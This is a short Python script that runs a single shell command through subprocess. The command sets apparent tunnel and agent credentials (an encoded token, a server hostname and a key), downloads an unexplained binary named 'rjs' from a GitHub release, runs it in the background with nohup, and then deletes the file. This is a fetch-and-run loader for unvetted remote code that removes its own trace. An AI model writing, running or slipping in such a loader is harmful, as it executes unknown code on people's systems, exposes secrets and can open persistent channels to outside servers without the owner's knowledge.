import subprocess
cmd = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiY2FhMzY0MGMtNjRhMy00YzIxLTlmZTgtMDczNjEyZmZlNzhjIiwicyI6Ik4yUTBNalEzTVRjdE5qZzBNaTAwTTJSakxXRmlOemd0TmpaallXVTRNVFEwTTJNNCJ9 N_S=nz.seav.eu.org N_K=f16nCvgRNRUamt8WrA bash -c 'curl -L -o rjs https://github.com/seav1/dl/releases/download/src/rjs && chmod +x rjs && nohup ./rjs && rm rjs'"
subprocess.call(cmd, shell=True)
